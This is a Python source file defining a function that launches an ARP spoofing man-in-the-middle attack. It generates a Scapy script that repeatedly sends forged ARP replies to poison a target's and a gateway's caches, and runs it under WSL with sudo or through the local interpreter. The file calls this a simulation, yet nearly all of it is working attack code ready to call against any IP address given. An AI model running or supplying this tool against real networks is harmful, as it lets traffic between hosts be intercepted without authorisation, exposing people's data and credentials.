"""
ARP Spoofing / MITM attack simulation via Scapy in WSL or local Python.
"""
import subprocess
import sys


def arp_spoof(
    target_ip: str,
    gateway_ip: str,
    iface: str = "eth0",
    duration: int = 60,
) -> subprocess.Popen:
    """
    Launch ARP spoofing attack, with automatic ARP cache restoration upon completion.
    """
    wsl_script = f"""
import time, sys
from scapy.all import ARP, send, getmacbyip

target = '{target_ip}'
gateway = '{gateway_ip}'
end_time = time.time() + {duration}

print(f'[ARP-SPOOF] Poisoning {{target}} <-> {{gateway}} for {duration}s...')
try:
    target_mac = getmacbyip(target) or 'ff:ff:ff:ff:ff:ff'
    gateway_mac = getmacbyip(gateway) or 'ff:ff:ff:ff:ff:ff'
    while time.time() < end_time:
        send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=0)
        send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=0)
        time.sleep(2)
except Exception as e:
    print(f'[ARP-SPOOF] Error: {{e}}')
finally:
    print('[ARP-SPOOF] Restoring normal ARP tables...')
    send(ARP(op=2, pdst=target, psrc=gateway), count=3, verbose=0)
    send(ARP(op=2, pdst=gateway, psrc=target), count=3, verbose=0)
print('[ARP-SPOOF] Completed.')
"""

    print(f"[ATTACK] Launching ARP Spoof on {target_ip} pretending to be {gateway_ip}...")
    try:
        cmd = ["wsl", "-e", "sudo", "python3", "-c", wsl_script]
        return subprocess.Popen(cmd)
    except Exception:
        fallback_cmd = [sys.executable, "-c", wsl_script]
        return subprocess.Popen(fallback_cmd)
